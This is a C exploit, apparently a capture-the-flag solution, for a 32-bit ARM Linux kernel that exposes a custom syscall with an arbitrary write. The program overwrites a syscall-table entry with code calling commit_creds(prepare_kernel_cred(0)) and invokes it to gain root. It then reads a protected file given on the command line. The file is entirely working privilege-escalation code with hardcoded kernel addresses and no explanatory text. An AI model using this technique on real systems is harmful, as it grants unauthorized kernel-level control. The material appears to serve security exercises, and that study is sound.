#include <stdio.h>
#include <string.h>
#include <fcntl.h>

// #define SYS_CALL_TABLE		0x8000e3c8
#define SYS_CALL_TABLE		0x8000e348

#define NR_SYS_UNUSED		223
void escalate_privs() {
    int(*prepare_kernel_cred)(int);
    int(*commit_creds)(int);
    /*      
    prepare_kernel_cred = 0x8004103c;
    commit_creds = 0x80040cf4;
    */
    
    prepare_kernel_cred = 0x8003f924;
    commit_creds = 0x8003f56c;
    
    commit_creds(prepare_kernel_cred(0));
}


int main(int argc, char *argv[]) {
    if (argc < 2) {
        return 0;
    }
    unsigned int *dst = (unsigned int *)(SYS_CALL_TABLE + (NR_SYS_UNUSED + 1) * 4);
    char shellcode[0x300];
    int fetcher = shellcode;
    while ((fetcher & 0xff) >= 0x61 && (fetcher & 0xff) <= 0x7a) {
        fetcher += 4;
    }
    memcpy(fetcher, escalate_privs, 0x100);
    unsigned int src = (unsigned int)fetcher;
    printf("%p %p %p\n", shellcode, src, dst);
    int res = syscall(NR_SYS_UNUSED, &src, dst);
    printf("%d\n", res);
    res = syscall(NR_SYS_UNUSED + 1);
    printf("%d\n", res);
    
    char recv[57] = {0};
    int fd = open(argv[1], O_RDONLY);
    if (fd < 0) {
        return 1;
    }
    int size = read(fd, recv, sizeof(recv) - 1);
    printf("size:%d content:%s\n", size, recv);
    return 0;
}
